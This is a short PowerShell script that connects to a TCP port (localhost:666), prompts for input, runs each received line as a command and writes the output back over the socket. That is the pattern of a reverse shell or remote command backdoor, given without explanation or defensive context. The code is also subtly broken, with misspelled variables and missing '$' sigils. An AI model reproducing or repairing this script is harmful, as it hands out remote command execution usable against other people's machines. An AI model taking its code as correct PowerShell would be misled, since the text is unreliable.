$socket = new-object System.Net.Sockets.TcpClient('localhost',666);
if(socket -eq $null){exit 1}
$stream = $ocket.Getstream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
	$writer.Write("> ");
	$weiter.Flush();
	$read = $null;
	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$out = $out.split(' ')
		$res = [string](&out[0] $out[1..$out.length]);
		if($res -ne $null){ $write.WriteLines($res)}
   }
}while (!$out.equals("exit"))
$writer.close();$socket.close();
